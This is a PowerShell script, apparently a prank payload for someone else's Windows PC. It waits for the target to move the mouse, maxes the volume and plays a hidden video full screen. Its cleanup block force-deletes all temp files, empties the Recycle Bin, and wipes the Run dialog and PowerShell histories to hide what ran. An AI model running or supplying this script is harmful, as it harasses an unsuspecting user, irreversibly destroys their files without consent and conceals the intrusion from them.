# Function to check if Windows Media Player is installed
Function Check-WindowsMediaPlayer {
    $wmplayerPath = "C:\Program Files\Windows Media Player\wmplayer.exe"
    if (Test-Path $wmplayerPath) {
        return $true
    }
    else {
        return $false
    }
}

# Function to open Windows Media Player in full screen and play the file
Function Play-VideoWithWMP {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$VideoPath
    )

    $wmplayerPath = "C:\Program Files\Windows Media Player\wmplayer.exe"
    
    if (Test-Path $VideoPath) {
        # Launch Windows Media Player and play the video
        Start-Process -FilePath $wmplayerPath -ArgumentList "/fullscreen", "`"$VideoPath`""
        
        # Minimize PowerShell window after launching the video
        $hwnd = Get-Process -Id $pid | ForEach-Object { $_.MainWindowHandle }
        if ($hwnd -ne 0) {
            $signature = @"
                [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@
            Add-Type -MemberDefinition $signature -Namespace Win32Functions -Name ShowWindow
            [Win32Functions.ShowWindow]::ShowWindowAsync($hwnd, 2)  # 2 = Minimize
        }
    }
    else {
        Write-Host "Video file not found at the specified path."
    }
}

# Function to set the system volume
Function Set-Volume {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int]
        $volume
    )

    # Calculate number of key presses to adjust volume. 
    $keyPresses = [Math]::Ceiling( $volume / 2 )
    
    # Create the Windows Shell object. 
    $obj = New-Object -ComObject WScript.Shell
    
    # Set volume to zero. 
    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
    
    # Set volume to specified level. 
    for( $i = 0; $i -lt $keyPresses; $i++ )
    {
        $obj.SendKeys( [char] 175 )
    }
}

# Function to simulate user interaction (e.g., caps lock)
Function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
        }
    }
}

#############################################################################################################################################

# Main Execution Block

# Check if Windows Media Player is installed
if (Check-WindowsMediaPlayer) {
    # Set the system volume to 100%
    Set-Volume 100
    
    # Path to the video file you want to play
    $VideoPath = "$env:TEMP\js\1.mp4"

    # Start the interaction simulation function
    Target-Comes

    # Play the video using Windows Media Player and minimize PowerShell
    Play-VideoWithWMP -VideoPath $VideoPath

    # Turn off capslock if it is left on
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
    if ($caps -eq $true) {
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }

    # Clean up temp files
    Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

    # Clear Run dialog history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

    # Clear PowerShell history
    Remove-Item (Get-PSReadlineOption).HistorySavePath

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
else {
    Write-Host "Windows Media Player is not installed on this system."
}
